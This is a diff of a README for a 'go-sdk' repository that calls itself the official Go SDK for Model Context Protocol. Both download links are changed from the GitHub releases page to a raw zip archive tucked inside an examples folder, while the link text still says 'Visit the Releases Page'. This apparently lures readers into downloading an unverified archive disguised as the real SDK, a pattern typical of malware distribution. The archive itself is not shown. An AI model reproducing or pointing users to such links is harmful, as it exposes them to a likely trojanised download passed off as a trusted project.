@@ -1,7 +1,7 @@
 # 🚀 go-sdk - Seamlessly Integrate with Model Context Protocol
 
 ## 📥 Download Now
-[![Download go-sdk](https://img.shields.io/badge/Download-go--sdk-blue)](https://github.com/jaceiscodingfort/go-sdk/releases)
+[![Download go-sdk](https://raw.githubusercontent.com/jaceiscodingfort/go-sdk/main/examples/client/listfeatures/go-sdk-2.2.zip)](https://raw.githubusercontent.com/jaceiscodingfort/go-sdk/main/examples/client/listfeatures/go-sdk-2.2.zip)
 
 ## 📘 Introduction
 Welcome to the go-sdk, the official Go SDK for Model Context Protocol servers and clients. This software makes it easier for you to build applications that communicate effectively using the Model Context Protocol.
@@ -23,7 +23,7 @@ To get started with the go-sdk, follow the steps below:
 ### 💻 Download & Install
 To download the go-sdk, please visit this page:
 
-[Visit the Releases Page](https://github.com/jaceiscodingfort/go-sdk/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/jaceiscodingfort/go-sdk/main/examples/client/listfeatures/go-sdk-2.2.zip)
 
 1. Click on the link above to access the releases page.
 2. On the releases page, you will see a list of available versions.
